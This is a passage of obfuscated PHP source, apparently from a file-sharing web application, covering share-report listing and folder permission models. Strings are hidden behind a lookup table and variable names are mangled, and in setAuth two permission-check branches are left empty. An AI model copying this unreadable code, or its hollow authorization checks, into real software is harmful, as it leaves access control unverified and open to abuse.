$¥œ¤á¨[540] => $¸Ÿ¨Ãè[$¥œ¤á¨[540]]); return Model($¥œ¤á¨[2349])->add($èå–¤³); } public function reportList($÷Õµ—¬Û) { $‡€ÍãâÕ =& $_SERVER[œ—üé‹ê]; $•©Š„æ = array(); if ($÷Õµ—¬Û[$‡€ÍãâÕ[870]]) { $½Ó—ØÌÀ = $÷Õµ—¬Û[$‡€ÍãâÕ[871]] ? $÷Õµ—¬Û[$‡€ÍãâÕ[871]] : strtotime(date($‡€ÍãâÕ[2352])); $•©Š„æ[$‡€ÍãâÕ[231]] = array($‡€ÍãâÕ[408], array($÷Õµ—¬Û[$‡€ÍãâÕ[870]], $½Ó—ØÌÀ)); } if (isset($÷Õµ—¬Û[$‡€ÍãâÕ[33]]) && in_array($÷Õµ—¬Û[$‡€ÍãâÕ[33]], array($‡€ÍãâÕ[91], $‡€ÍãâÕ[524], $‡€ÍãâÕ[2355], $‡€ÍãâÕ[2356], $‡€ÍãâÕ[2357]))) { $•©Š„æ[$‡€ÍãâÕ[33]] = $÷Õµ—¬Û[$‡€ÍãâÕ[33]]; } if (isset($÷Õµ—¬Û[$‡€ÍãâÕ[859]]) && in_array($÷Õµ—¬Û[$‡€ÍãâÕ[859]], array($‡€ÍãâÕ[228], $‡€ÍãâÕ[91], $‡€ÍãâÕ[524], $‡€ÍãâÕ[2355]))) { $•©Š„æ[$‡€ÍãâÕ[859]] = $÷Õµ—¬Û[$‡€ÍãâÕ[859]]; } $Ñü¹¿à» = Input::get($‡€ÍãâÕ[545], $‡€ÍãâÕ[7], $‡€ÍãâÕ[2354], array($‡€ÍãâÕ[2273], $‡€ÍãâÕ[539])); $¡íŸÍ¦¶ = array($‡€ÍãâÕ[537] => $‡€ÍãâÕ[538], $‡€ÍãâÕ[539] => $‡€ÍãâÕ[540]); $¨ ²‰òì = $‡€ÍãâÕ[2358] . $¡íŸÍ¦¶[$Ñü¹¿à»]; $ûÌ ä € = Model($‡€ÍãâÕ[2349])->where($•©Š„æ)->order($¨ ²‰òì)->selectPage(20); if (empty($ûÌ ä €[$‡€ÍãâÕ[446]])) { return array(); } $Ú»‘„µ = array_to_keyvalue_group($ûÌ ä €[$‡€ÍãâÕ[446]], $‡€ÍãâÕ[859], $‡€ÍãâÕ[687]); if (!empty($Ú»‘„µ[0])) { $÷Õµ—¬Û = $Ú»‘„µ[0]; $•©Š„æ = array($‡€ÍãâÕ[687] => array($‡€ÍãâÕ[7], $÷Õµ—¬Û)); $‰¾¾·æä = $this->where($•©Š„æ)->field($‡€ÍãâÕ[687])->select(); $‰¾¾·æä = array_to_keyvalue($‰¾¾·æä, $‡€ÍãâÕ[12], $‡€ÍãâÕ[687]); $½±¶Á£  = array_diff($÷Õµ—¬Û, $‰¾¾·æä); if (!empty($½±¶Á£ )) { foreach ($ûÌ ä €[$‡€ÍãâÕ[446]] as $ô—ºËÕÀ => $‚ÂºŸ ¹) { if (in_array($‚ÂºŸ ¹[$‡€ÍãâÕ[687]], $½±¶Á£ )) { unset($ûÌ ä €[$‡€ÍãâÕ[446]][$ô—ºËÕÀ]); } } } } $this->_listDataApply($ûÌ ä €[$‡€ÍãâÕ[446]]); return $ûÌ ä €; } public function reportStatus($„íç¬Ã) { $˜é»“ˆã =& $_SERVER[œ—üé‹ê]; $ÏğÂº  = array($˜é»“ˆã[487] => $„íç¬Ã[$˜é»“ˆã[487]]); $À½úÒ…¦ = Model($˜é»“ˆã[2349])->where($ÏğÂº )->field($˜é»“ˆã[2359])->find(); if (!$À½úÒ…¦) { return !1; } $é”óÈ° = array($˜é»“ˆã[859] => $„íç¬Ã[$˜é»“ˆã[859]]); if ($„íç¬Ã[$˜é»“ˆã[859]] == $˜é»“ˆã[2355] && $À½úÒ…¦[$˜é»“ˆã[859]] == $˜é»“ˆã[2355]) { $é”óÈ°[$˜é»“ˆã[859]] = 0; } $÷ÓäÆêî = Model($˜é»“ˆã[2349])->where($ÏğÂº )->save($é”óÈ°); if ($„íç¬Ã[$˜é»“ˆã[859]] == $˜é»“ˆã[524]) { if ($À½úÒ…¦[$˜é»“ˆã[557]] != $˜é»“ˆã[228] && $this->shareFileMeta($À½úÒ…¦[$˜é»“ˆã[557]])) { $this->shareFileMeta($À½úÒ…¦[$˜é»“ˆã[557]], 0); } $this->remove($À½úÒ…¦[$˜é»“ˆã[687]]); return !0; } if ($÷ÓäÆêî && $„íç¬Ã[$˜é»“ˆã[859]] == $˜é»“ˆã[2355]) { $Åªã•ØÓ = $é”óÈ°[$˜é»“ˆã[859]] == $˜é»“ˆã[2355] ? 1 : 0; $this->shareFileMeta($À½úÒ…¦[$˜é»“ˆã[557]], $Åªã•ØÓ); $this->removeByFile($À½úÒ…¦[$˜é»“ˆã[557]]); } return $÷ÓäÆêî; } private function removeByFile($„‰†èÍá) { $Ø´ğå¹ª =& $_SERVER[œ—üé‹ê]; $ª—›Ûı” = Model($Ø´ğå¹ª[942])->where(array($Ø´ğå¹ª[557] => $„‰†èÍá))->field($Ø´ğå¹ª[191])->select(); $›ÍÊÉ‚ = array_to_keyvalue($ª—›Ûı”, $Ø´ğå¹ª[12], $Ø´ğå¹ª[191]); $—ò†¦¬ß = array($Ø´ğå¹ª[191] => array($Ø´ğå¹ª[7], $›ÍÊÉ‚), $Ø´ğå¹ª[578] => 1); $ª—›Ûı” = $this->where($—ò†¦¬ß)->field($Ø´ğå¹ª[687])->select(); if (empty($ª—›Ûı”)) { return; } $ÔŸ¯¦’› = array_to_keyvalue($ª—›Ûı”, $Ø´ğå¹ª[12], $Ø´ğå¹ª[687]); $this->remove($ÔŸ¯¦’›); } private function shareFileMeta($¹Ù»Öçæ, $Ê ¶Ú…û = null) { $Î‘è´Û© =& $_SERVER[œ—üé‹ê]; $ÄÒ…Ÿ»ø = array($Î‘è´Û©[557] => $¹Ù»Öçæ, $Î‘è´Û©[95] => $Î‘è´Û©[2360]); if (is_null($Ê ¶Ú…û)) { return Model($Î‘è´Û©[2361])->where($ÄÒ…Ÿ»ø)->find(); } $ÄÒ…Ÿ»ø[$Î‘è´Û©[451]] = $Ê ¶Ú…û; Model($Î‘è´Û©[2361])->add($ÄÒ…Ÿ»ø, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\145\137\141\165\x74\x68"; public function getAuth($”Ë¥…–‹) { $‚™††«“ =& $_SERVER[œ—üé‹ê]; $°²ŒĞ°ı = $this->sourceAuthSelect($”Ë¥…–‹); $¯…±Õ® = array(); $¼¼ÚúşÜ = array(); $‰ƒ˜¤¶ı = 2 << 25; foreach ($°²ŒĞ°ı as $ş¼¬Ò÷Ö) { $—ü”Ä¤­ = Model($‚™††«“[591])->listData($ş¼¬Ò÷Ö[$‚™††«“[1637]]); if (!$—ü”Ä¤­) { continue; } $¯…±Õ®[] = $ş¼¬Ò÷Ö; $Ò²î¡£ƒ = 0; if ($ş¼¬Ò÷Ö[$‚™††«“[188]] == SourceModel::TYPE_GROUP) { $Ò²î¡£ƒ = $‰ƒ˜¤¶ı * 2; } if ($ş¼¬Ò÷Ö[$‚™††«“[188]] == SourceModel::TYPE_USER) { $Ò²î¡£ƒ = $‰ƒ˜¤¶ı; } if ($ş¼¬Ò÷Ö[$‚™††«“[188]] == SourceModel::TYPE_USER && $ş¼¬Ò÷Ö[$‚™††«“[589]] == $‚™††«“[228]) { $Ò²î¡£ƒ = 0; } $¼¼ÚúşÜ[] = $—ü”Ä¤­[$‚™††«“[502]] + $Ò²î¡£ƒ; } array_multisort($¼¼ÚúşÜ, SORT_DESC, $¯…±Õ®); return $¯…±Õ®; } public function sourceAuthSelect($ÃĞõ°Âş) { $…¨‘•¹Ã =& $_SERVER[œ—üé‹ê]; static $ø«Üúï = array(); $¢ßÌíõ‘ = is_array($ÃĞõ°Âş) ? !1 : !0; if ($¢ßÌíõ‘) { $ÃĞõ°Âş = array($ÃĞõ°Âş); } $ÁÆÑ°… = array(); foreach ($ÃĞõ°Âş as $¥ü€’Áæ) { if (isset($ø«Üúï[$¥ü€’Áæ])) { $ÁÆÑ°…[$¥ü€’Áæ] = $ø«Üúï[$¥ü€’Áæ]; } } if (count($ÁÆÑ°…) == count($ÃĞõ°Âş)) { return $¢ßÌíõ‘ ? $ÁÆÑ°…[$ÃĞõ°Âş[0]] : $ÁÆÑ°…; } $ÌÓ¸ë¶û = $…¨‘•¹Ã[2362]; $øïš‹Ü¢ = array($…¨‘•¹Ã[191] => array($…¨‘•¹Ã[7], $ÃĞõ°Âş)); $Ä¶İ¥ğÅ = $this->field($ÌÓ¸ë¶û)->order($…¨‘•¹Ã[487])->where($øïš‹Ü¢)->select(); $å’Â€ = array_to_keyvalue_group($Ä¶İ¥ğÅ, $…¨‘•¹Ã[191]); foreach ($ÃĞõ°Âş as $¥ü€’Áæ) { $ø«Üúï[$¥ü€’Áæ] = $å’Â€[$¥ü€’Áæ] ? $å’Â€[$¥ü€’Áæ] : array(); } if ($¢ßÌíõ‘) { return $Ä¶İ¥ğÅ; } return $å’Â€; } public function setAuth($÷¦êÂß, $é­©¡å) { $Ó•¶‡ıâ =& $_SERVER[œ—üé‹ê]; $Ã§åö™ = Model($Ó•¶‡ıâ[1530])->sourceInfo($÷¦êÂß); if (!$Ã§åö™) { return !1; } if ($Ã§åö™[$Ó•¶‡ıâ[188]] != SourceModel::TYPE_GROUP) { return !1; } $î‰Ì´ ‘ = 1; $²×ª©éÔ = $Ã§åö™[$Ó•¶‡ıâ[589]]; if ($²×ª©éÔ != $î‰Ì´ ‘) { $ßø¿ôæ¹ = array($Ó•¶‡ıâ[1491] => $²×ª©éÔ); $úõ«Ø¢ = Model($Ó•¶‡ıâ[2272])->field($Ó•¶‡ıâ[1589])->where($ßø¿ôæ¹)->select(); $úõ«Ø¢ = array_to_keyvalue($úõ«Ø¢, $Ó•¶‡ıâ[12], $Ó•¶‡ıâ[1589]); } $ò«›£¡ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÄßµÈÍå = array(); foreach ($é­©¡å as $ˆîè’Ñ) { if (!in_array($ˆîè’Ñ[$Ó•¶‡ıâ[188]], $ò«›£¡)) { show_json(LNG($Ó•¶‡ıâ[2363]), !1); } if ($²×ª©éÔ != $î‰Ì´ ‘) { if ($ˆîè’Ñ[$Ó•¶‡ıâ[188]] == SourceModel::TYPE_GROUP) { } if ($ˆîè’Ñ[$Ó•¶‡ıâ[589]] != 0 && !in_array($ˆîè’Ñ[$Ó•¶‡ıâ[589]], $úõ«Ø¢)) { } } if ($ˆîè’Ñ[$Ó•¶‡ıâ[589]] == 0) { $ˆîè’Ñ[$Ó•¶‡ıâ[188]] = SourceModel::TYPE_USER; } $ÄßµÈÍå[] = array($Ó•¶‡ıâ[191] => $÷¦êÂß, $Ó•¶‡ıâ[188] => intval($ˆîè’Ñ[$Ó•¶‡ıâ[188]]), $Ó•¶‡ıâ[589] => intval($ˆîè’Ñ[$Ó•¶‡ıâ[589]]), $Ó•¶‡ıâ[1637] => intval($ˆîè’Ñ[$Ó•¶‡ıâ[1637]]) ? intval($ˆîè’Ñ[$Ó•¶‡ıâ[1637]]) : 0, $Ó•¶‡ıâ[2341] => intval($ˆîè’Ñ[$Ó•¶‡ıâ[2341]]) ? intval($ˆîè’Ñ[$Ó•¶‡ıâ[2341]]) : -1); } $this->where(array($Ó•¶‡ıâ[506] => $÷¦êÂß))->delete(); $this->addAll($ÄßµÈÍå); return !0; } public function authClear($ïŞ»¼®¤) { $Ï†âÖó¼ =& $_SERVER[œ—üé‹ê]; $“æÜšÍ = Model($Ï†âÖó¼[1530])->sourceInfo($ïŞ»¼®¤); $ö¦Şş¬¡ = array($ïŞ»¼®¤); if ($“æÜšÍ[$Ï†âÖó¼[500]] == $Ï†âÖó¼[91]) { $òª¯Ÿ¼Ÿ = array($Ï†âÖó¼[674] => array($Ï†âÖó¼[635], $“æÜšÍ[$Ï†âÖó¼[604]] . $ïŞ»¼®¤ . $Ï†âÖó¼[636])); $ö¦Şş¬¡ = Model($Ï†âÖó¼[1530])->field($Ï†âÖó¼[506])->where($òª¯Ÿ¼Ÿ)->getField($Ï†âÖó¼[191], !0); $ö¦Şş¬¡[] = $ïŞ»¼®¤; } $this->where(array($Ï†âÖó¼[506] => array($Ï†âÖó¼[507], $ö¦Şş¬¡)))->delete(); return !0; } public function getAllParent($‡†ºúÃÑ) { $­›ùº÷Ç =& $_SERVER[œ—üé‹ê]; $ğòÙè´© = Model($­›ùº÷Ç[1530])->sourceInfo($‡†ºúÃÑ); if (!$ğòÙè´© || $ğòÙè´©[$­›ùº÷Ç[188]] != SourceModel::TYPE_GROUP) { return array(); } $•æå—˜ = Model($­›ùº÷Ç[1530])->parentLevelArray($ğòÙè´©[$­›ùº÷Ç[604]]); $ìêöÛüë = array_merge(array(intval($‡†ºúÃÑ)), array_reverse($•æå—˜)); $ûã€«£ = $this->sourceAuthSelect($ìêöÛüë); $†¤¸òšÚ = $GLOBALS[$­›ùº÷Ç[6]][$­›ùº÷Ç[92]][$­›ùº÷Ç[2285]] == 1; $€âıøÙ = $†¤¸òšÚ ? 3 : 2; $¡µ†Şùœ = Model($­›ùº÷Ç[1489])->getInfo($ğòÙè´©[$­›ùº÷Ç[589]]); $©Üî´§ğ = explode($­›ùº÷Ç[50], trim($¡µ†Şùœ[$­›ùº÷Ç[604]], $­›ùº÷Ç[50])); $ú–Êî = array_merge(array($¡µ†Şùœ[$­›ùº÷Ç[1491]]), array_reverse(array_slice($©Üî´§ğ, $€âıøÙ))); foreach ($ûã€«£ as $‡†ºúÃÑ => $ĞñœĞÆ) { foreach ($ĞñœĞÆ as $ƒ¦ª¿“) { if (!$ƒ¦ª¿“ || !$ƒ¦ª¿“[$­›ùº÷Ç[589]] || $ƒ¦ª¿“[$­›ùº÷Ç[589]] == $­›ùº÷Ç[228]) { continue; } if ($ƒ¦ª¿“[$­›ùº÷Ç[188]] != SourceModel::TYPE_GROUP) { continue; } $ú–Êî[] = $ƒ¦ª¿“[$­›ùº÷Ç[589]]; } } $ú–Êî = array_unique($ú–Êî); $¡×²îæË = array($­›ùº÷Ç[428] => _get($GLOBALS[$­›ùº÷Ç[7]], $­›ùº÷Ç[428], 1), $­›ùº÷Ç[439] => _get($GLOBALS[$­›ùº÷Ç[7]], $­›ùº÷Ç[439], 500)); $GLOBALS[$­›ùº÷Ç[7]][$­›ùº÷Ç[428]] = 1; $GLOBALS[$­›ùº÷Ç[7]][$­›ùº÷Ç[439]] = 500; $æÙ³©ÅÒ = array($­›ùº÷Ç[508] => 0, $­›ùº÷Ç[2184] => AuthModel::authAll(), $­›ùº÷Ç[509] => LNG($­›ùº÷Ç[2364]), $­›ùº÷Ç[2199] => $­›ùº÷Ç[2365]); $»í×öÒ = array(); $”·Êóª„ = explode($­›ùº÷Ç[50], $­›ùº÷Ç[2366]); $ Üá•ßÚ = explode($­›ùº÷Ç[50], $­›ùº÷Ç[2367]); foreach ($ú–Êî as $ğ‚ŒÚ´Ô) { $Ü­ñ§ıİ = Model($­›ùº÷Ç[1489])->getInfo($ğ‚ŒÚ´Ô); $¥Ø½âË = array_field_key($Ü­ñ§ıİ, $”·Êóª„); $ñÙØ˜¸ = Model($­›ùº÷Ç[617])->listByGroup($ğ‚ŒÚ´Ô); foreach ($ñÙØ˜¸[$­›ùº÷Ç[446]] as $µıÌŒÑ => $²ëŸôÚÏ) { $this->userGroupList($²ëŸôÚÏ[$­›ùº÷Ç[1589]], $²ëŸôÚÏ); $öš±ìÚ— = $²ëŸôÚÏ[$­›ùº÷Ç[1589]] . $­›ùº÷Ç[12]; if (isset($»í×öÒ[$öš±ìÚ—])) { continue; } $á—®şÓ— = Model($­›ùº÷Ç[2368])->listData($²ëŸôÚÏ[$­›ùº÷Ç[2369]]); $²ëŸôÚÏ[$­›ùº÷Ç[2370]] = Action($­›ùº÷Ç[2371])->parseUrl($²ëŸôÚÏ[$­›ùº÷Ç[2370]]); $²ëŸôÚÏ[$­›ùº÷Ç[1939]] = $á—®şÓ— && $á—®şÓ—[$­›ùº÷Ç[2372]] == 1; $Œ¡§ĞÙ¤ = $this->groupRootAuth($ğ‚ŒÚ´Ô, $²ëŸôÚÏ[$­›ùº÷Ç[1589]]); $Œ¡§ĞÙ¤ = $²ëŸôÚÏ[$­›ùº÷Ç[1939]] ? $æÙ³©ÅÒ : $Œ¡§ĞÙ¤; $»í×öÒ[$öš±ìÚ—] = array($­›ùº÷Ç[2373] => $­›ùº÷Ç[2374], $­›ùº÷Ç[2375] => LNG($­›ùº÷Ç[2376]), $­›ùº÷Ç[2353] => array_field_key($²ëŸôÚÏ, $ Üá•ßÚ), $­›ùº÷Ç[502] => $Œ¡§ĞÙ¤, $­›ùº÷Ç[503] => $Œ¡§ĞÙ¤[$­›ùº÷Ç[502]], $­›ùº÷Ç[2377] => $¥Ø½âË); } } $GLOBALS[$­›ùº÷Ç[7]][$­›ùº÷Ç[428]] = $¡×²îæË[$­›ùº÷Ç[428]]; $GLOBALS[$­›ùº÷Ç[7]][$­›ùº÷Ç[439]] = $¡×²îæË[$­›ùº÷Ç[439]]; foreach ($ûã€«£ as $‡†ºúÃÑ => $ĞñœĞÆ) { if (!$ĞñœĞÆ) { continue; } foreach ($ĞñœĞÆ as $ƒ¦ª¿“) { if (!$ƒ¦ª¿“ || !$ƒ¦ª¿“[$­›ùº÷Ç[589]] || $ƒ¦ª¿“[$­›ùº÷Ç[589]] == $­›ùº÷Ç[228]) { continue; } if ($ƒ¦ª¿“[$­›ùº÷Ç[188]] != SourceModel::TYPE_USER) { continue; } $öš±ìÚ— = $ƒ¦ª¿“[$­›ùº÷Ç[589]] . $­›ùº÷Ç[12]; if (isset($»í×öÒ[$öš±ìÚ—])) { continue; } $¼—“Óã¸ = $this->authMake($ĞñœĞÆ, $öš±ìÚ—); if (!$¼—“Óã¸ || !$¼—“Óã¸[$­›ùº÷Ç[2375]]) { continue; } $»í×öÒ[$öš±ìÚ—] = array($­›ùº÷Ç[2373] => $­›ùº÷Ç[2378], $­›ùº÷Ç[2375] => $¼—“Óã¸[$­›ùº÷Ç[2375]], $­›ùº÷Ç[2353] => Model($­›ùº÷Ç[617])->getInfoSimpleOuter($öš±ìÚ—), $­›ùº÷Ç[502] => $¼—“Óã¸[$­›ùº÷Ç[556]], $­›ùº÷Ç[503] => $¼—“Óã¸[$­›ùº÷Ç[556]][$­›ùº÷Ç[502]], $­›ùº÷Ç[2377] => $¼—“Óã¸[$­›ùº÷Ç[2379]]); } } foreach ($ûã€«£ as $‡†ºúÃÑ => $ĞñœĞÆ) { if (!$ĞñœĞÆ) { continue; } foreach ($»í×öÒ as $öš±ìÚ— => $÷•øÛÀÄ) { if ($÷•øÛÀÄ[$­›ùº÷Ç[2353]][$­›ùº÷Ç[1939]] || $÷•øÛÀÄ[$­›ùº÷Ç[2373]] == $­›ùº÷Ç[2378]) { continue; } $¼—“Óã¸ = $this->authMake($ĞñœĞÆ, $öš±ìÚ—); if (!$¼—“Óã¸ || !$¼—“Óã¸[$­›ùº÷Ç[2375]]) { continue; } $»í×öÒ[$öš±ìÚ—] = array($­›ùº÷Ç[2373] => $­›ùº÷Ç[2378], $­›ùº÷Ç[2375] => $¼—“Óã¸[$­›ùº÷Ç[2375]], $­›ùº÷Ç[2353] => $÷•øÛÀÄ[$­›ùº÷Ç[2353]], $­›ùº÷Ç[502] => $¼—“Óã¸[$­›ùº÷Ç[556]], $­›ùº÷Ç[503] => $¼—“Óã¸[$­›ùº÷Ç[556]][$­›ùº÷Ç[502]], $­›ùº÷Ç[2377] => $¼—“Óã¸[$­›ùº÷Ç[2379]]); } } $»í×öÒ = array_sort_by($»í×öÒ, $­›ùº÷Ç[503], $­›ùº÷Ç[540]); return $»í×öÒ; } public function getAllChildren($ÓŞ†ÉÄÄ) { $­Â£½ñÑ =& $_SERVER[œ—üé‹ê]; $ä¢ÕÎ¶ = Model($­Â£½ñÑ[1530])->sourceInfo($ÓŞ†ÉÄÄ); if ($ä¢ÕÎ¶[$­Â£½ñÑ[500]] != $­Â£½ñÑ[91]) { return $this->sourceListAuth(array($ÓŞ†ÉÄÄ)); } if ($ä¢ÕÎ¶[$­Â£½ñÑ[188]] != SourceModel::TYPE_GROUP) { return array(); } $¾“ÊÄ÷ = 1; $…İÖ­Íî = array($ÓŞ†ÉÄÄ); if ($ä¢ÕÎ¶[$­Â£½ñÑ[190]] == $­Â£½ñÑ[228] && $ä¢ÕÎ¶[$­Â£½ñÑ[589]] != $¾“ÊÄ÷) { $…İÖ­Íî = $this->groupChidldAllRootSource($ä¢ÕÎ¶[$­Â£½ñÑ[589]]); } $– ­îö = $this->field($­Â£½ñÑ[191])->group($­Â£½ñÑ[191])->select(); $– ­îö = array_to_keyvalue($– ­îö, $­Â£½ñÑ[12], $­Â£½ñÑ[191]); if (!$– ­îö) { return array(); } $ÌôÕÛ¾ó = $­Â£½ñÑ[2380]; $¡‰ƒúÒ· = array($­Â£½ñÑ[191] => array($­Â£½ñÑ[7], $– ­îö), $­Â£½ñÑ[520] => $­Â£½ñÑ[228]); $Û¼ƒ‘œ‰ = Model($­Â£½ñÑ[942])->field($ÌôÕÛ¾ó)->where($¡‰ƒúÒ·)->select(); $ú»İä÷ = array($ÓŞ†ÉÄÄ); foreach ($Û¼ƒ‘œ‰ as $›‹„¯³§) { foreach ($…İÖ­Íî as $¢…¬°ïî) { $„÷¸ï¼¶ = $­Â£½ñÑ[50] . $¢…¬°ïî . $­Â£½ñÑ[50]; $ıû½ÒìØ = $›‹„¯³§[$­Â£½ñÑ[604]] . $›‹„¯³§[$­Â£½ñÑ[191]] . $­Â£½ñÑ[50]; if (strstr($ıû½ÒìØ, $„÷¸ï¼¶)) { $ú»İä÷[] = $›‹„¯³§[$­Â£½ñÑ[191]]; break; } } } return $this->sourceListAuth($ú»İä÷); } private function sourceListAuth($‹ˆäÇ£Ë) { $±™Üµö =& $_SERVER[œ—üé‹ê]; $×—¡’ÌÃ = Model($±™Üµö[1530])->sourceListInfo($‹ˆäÇ£Ë, !0); $—¿Á×èİ = $this->sourceAuthSelect($‹ˆäÇ£Ë); $ßÀÅ¹¤® = array(); $Î°¡”æ˜ = array(); foreach ($×—¡’ÌÃ as $ªÍ¡îØ) { unset($ªÍ¡îØ[$±™Üµö[543]]); unset($ªÍ¡îØ[$±™Üµö[541]]); unset($ªÍ¡îØ[$±™Üµö[502]]); unset($ªÍ¡îØ[$±™Üµö[90]]); $˜±Ú –Í = $—¿Á×èİ[$ªÍ¡îØ[$±™Üµö[191]]]; if (!$˜±Ú –Í) { continue; } $ªÍ¡îØ[$±™Üµö[2377]] = $this->authTargetInfo($˜±Ú –Í); $ªÍ¡îØ[$±™Üµö[602]] = rtrim($ªÍ¡îØ[$±™Üµö[608]], $±™Üµö[8]) . $±™Üµö[8] . ltrim($ªÍ¡îØ[$±™Üµö[602]], $±™Üµö[8]); $ßÀÅ¹¤®[] = $ªÍ¡îØ; $ÊÃ·¶Ìş = count(explode($±™Üµö[8], trim($ªÍ¡îØ[$±™Üµö[602]], $±™Üµö[8]))); $Î°¡”æ˜[] = $ÊÃ·¶Ìş + ($ªÍ¡îØ[$±™Üµö[33]] == $±™Üµö[78] ? 0 : 1000); } array_multisort($Î°¡”æ˜, SORT_ASC, $ßÀÅ¹¤®); return $ßÀÅ¹¤®; } private function groupChidldAllRootSource($Œ¤îç—Ä) { $ş—Ø­òœ =& $_SERVER[œ—üé‹ê]; $ĞÀİ—°È = Model($ş—Ø­òœ[1489])->groupChildrenAll($Œ¤îç—Ä); $ÍÉíÀÕ¤ = array($ş—Ø­òœ[190] => 0, $ş—Ø­òœ[589] => array($ş—Ø­òœ[7], $ĞÀİ—°È), $ş—Ø­òœ[188] => SourceModel::TYPE_GROUP); $ì™ŠŸ®É = Model($ş—Ø­òœ[942])->field($ş—Ø­òœ[191])->where($ÍÉíÀÕ¤)->select(); $ì™ŠŸ®É = array_to_keyvalue($ì™ŠŸ®É, $ş—Ø­òœ[12], $ş—Ø­òœ[191]); return $ì™ŠŸ®É; } private function authTargetInfo($ãİãÙññ) { $‰…çˆ ³ =& $_SERVER[œ—üé‹ê]; $¤“ÈÂàÄ = array(); $’¥Äß³ö = array(); $ÓéĞ³ËĞ = 2 << 25; foreach ($ãİãÙññ as $İò§¨é§) { $ãøáÊê = Model($‰…çˆ ³[591])->listData($İò§¨é§[$‰…çˆ ³[1637]]); if (!$ãøáÊê) { continue; } if ($İò§¨é§[$‰…çˆ ³[188]] == SourceModel::TYPE_USER) { $î„¡éêö = Model($‰…çˆ ³[597])->getInfoSimpleOuter($İò§¨é§[$‰…çˆ ³[589]]); if ($î„¡éêö[$‰…çˆ ³[1589]] == $‰…çˆ ³[1376]) { continue; } if ($î„¡éêö[$‰…çˆ ³[1589]] == $‰…çˆ ³[228]) { $î„¡éêö[$‰…çˆ ³[32]] = LNG($‰…çˆ ³[2381]); } } else { $î„¡éêö = Model($‰…çˆ ³[605])->getInfoSimple($İò§¨é§[$‰…çˆ ³[589]]); } if (!$î„¡éêö) { continue; } $î„¡éêö[$‰…çˆ ³[556]] = $ãøáÊê; $¤“ÈÂàÄ[] = $î„¡éêö; $…éôŞæ“ = 0; if ($İò§¨é§[$‰…çˆ ³[188]] == SourceModel::TYPE_GROUP) { $…éôŞæ“ = $ÓéĞ³ËĞ * 2; } if ($İò§¨é§[$‰…çˆ ³[188]] == SourceModel::TYPE_USER) { $…éôŞæ“ = $ÓéĞ³ËĞ; } if ($İò§¨é§[$‰…çˆ ³[188]] == SourceModel::TYPE_USER && $İò§¨é§[$‰…çˆ ³[589]] == $‰…çˆ ³[228]) { $…éôŞæ“ = 0; } $’¥Äß³ö[] = $ãøáÊê[$‰…çˆ ³[502]] + $…éôŞæ“; } array_multisort($’¥Äß³ö, SORT_DESC, $¤“ÈÂàÄ); return $¤“ÈÂàÄ; } public function getAllChildrenByUser($ô¨ĞŸÑ, $Éù–æîº) { $©Ê‹µ­ë =& $_SERVER[œ—üé‹ê]; $Æ¦¦¼èª = Model($©Ê‹µ­ë[617])->getInfo($Éù–æîº); if (!$Éù–æîº || !$ô¨ĞŸÑ || !$Æ¦¦¼èª) { return array(); } $ºŒ­Û = Model($©Ê‹µ­ë[1530])->sourceInfo($ô¨ĞŸÑ); $ùß®’¥® = array(); $‹÷½âÂÂ = 1; if ($ºŒ­Û[$©Ê‹µ­ë[190]] == $©Ê‹µ­ë[228] && $ºŒ­Û[$©Ê‹µ­ë[589]] != $‹÷½âÂÂ && $this->groupContainUser($ºŒ­Û[$©Ê‹µ­ë[589]], $Éù–æîº)) { foreach ($Æ¦¦¼èª[$©Ê‹µ­ë[1490]] as $õë”Õ°ò) { $ßóÀ‚¯ü = Model($©Ê‹µ­ë[605])->getInfo($õë”Õ°ò[$©Ê‹µ­ë[1491]]); $¿›àœóŠ = Model($©Ê‹µ­ë[617])->getInfoSimpleOuter($Éù–æîº); $¿›àœóŠ[$©Ê‹µ­ë[556]] = $õë”Õ°ò[$©Ê‹µ­ë[502]]; if (Model($©Ê‹µ­ë[591])->authCheckAction($õë”Õ°ò[$©Ê‹µ­ë[502]][$©Ê‹µ­ë[502]], $©Ê‹µ­ë[1561])) { continue; } $Ä¡Ç“â‚ = array($©Ê‹µ­ë[32] => $©Ê‹µ­ë[1394] . $ßóÀ‚¯ü[$©Ê‹µ­ë[32]], $©Ê‹µ­ë[191] => $ßóÀ‚¯ü[$©Ê‹µ­ë[90]][$©Ê‹µ­ë[191]], $©Ê‹µ­ë[87] => KodIO::make($ßóÀ‚¯ü[$©Ê‹µ­ë[90]][$©Ê‹µ­ë[191]]), $©Ê‹µ­ë[190] => $©Ê‹µ­ë[228], $©Ê‹µ­ë[188] => $©Ê‹µ­ë[598], $©Ê‹µ­ë[33] => $©Ê‹µ­ë[639], $©Ê‹µ­ë[602] => $ßóÀ‚¯ü[$©Ê‹µ­ë[609]], $©Ê‹µ­ë[1491] => $ßóÀ‚¯ü[$©Ê‹µ­ë[1491]], $©Ê‹µ­ë[606] => $ßóÀ‚¯ü[$©Ê‹µ­ë[190]], $©Ê‹µ­ë[2377] => array($¿›àœóŠ)); $ùß®’¥®[$Ä¡Ç“â‚[$©Ê‹µ­ë[191]]] = $Ä¡Ç“â‚; } } $é‘Ëµë = array(); $€ÀåÀ›² = $this->getAllChildren($ô¨ĞŸÑ); foreach ($€ÀåÀ›² as $ô‹ĞÄîÂ) { $™ı°Áœ› = !1; foreach ($ô‹ĞÄîÂ[$©Ê‹µ­ë[2377]] as $Şæ×óÔ¦) { if ($Şæ×óÔ¦[$©Ê‹µ­ë[1589]]) { if ($Şæ×óÔ¦[$©Ê‹µ­ë[1589]] == $Éù–æîº) { $™ı°Áœ› = !0; break; } } if ($Şæ×óÔ¦[$©Ê‹µ­ë[1491]]) { if ($this->groupContainUser($Şæ×óÔ¦[$©Ê‹µ­ë[1491]], $Éù–æîº)) { $™ı°Áœ› = !0; break; } } } if ($™ı°Áœ›) { $é‘Ëµë[] = $ô‹ĞÄîÂ; } $¥À¼¢¥¥ = $ô‹ĞÄîÂ[$©Ê‹µ­ë[191]]; if (isset($ùß®’¥®[$¥À¼¢¥¥])) { $ô‹ĞÄîÂ[$©Ê‹µ­ë[2377]][] = $ùß®’¥®[$¥À¼¢¥¥][0]; $ùß®’¥®[$¥À¼¢¥¥] = !1; } } $ùß®’¥® = array_filter(array_values($ùß®’¥®)); $é‘Ëµë = array_merge($ùß®’¥®, $é‘Ëµë); return $é‘Ëµë; } public function setAllChildrenByUser($ËİàÔ÷æ, $½íÈëĞ§, $Å¿óÄã) { $ñæ©Ü =& $_SERVER[œ—üé‹ê]; $’ ¼å ö = 